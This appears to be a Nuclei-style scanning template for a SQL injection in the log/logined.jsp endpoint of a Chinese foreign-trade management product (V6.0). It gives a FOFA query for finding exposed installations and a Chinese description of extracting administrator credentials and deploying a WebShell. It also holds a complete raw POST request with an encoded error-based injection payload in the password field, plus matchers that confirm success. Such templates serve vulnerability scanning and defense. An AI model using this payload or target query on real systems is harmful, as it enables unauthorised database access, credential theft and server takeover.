id: bosi-logined_jsp-sql

info:
  name: "博斯外贸管理软件V6.0 log 接口SQL注入"
  author: Unknown
  severity: high
  description: |-
    fofa: title="欢迎使用 博斯软件"
      博斯外贸管理软件V6.0版本中，log/logined.jsp接口存在SQL注入缺陷。攻击者可通过构造恶意SQL语句实现数据库敏感信息提取，包括管理员账户凭证及用户隐私数据。在具备数据库写权限条件下，可实施二次注入攻击部署WebShell，最终达成服务器权限控制目标。
  reference:
  - https://mp.weixin.qq.com/s/lKVgttqLBt_y0MiNMXLHuA?token=668829287&lang=zh_CN
  tags: 博斯外贸管理软件


http:
- raw:
  - |
    POST /log/logined.jsp HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br, zstd
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Connection: keep-alive

    Submit=-1&account=-1&password=1%27+AND+9085+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289085%3D9085%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29+AND+%27GSSe%27%3D%27GSSe

  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'qxpkq1qvxpq'
    condition: and
  - type: status
    status:
    - 200
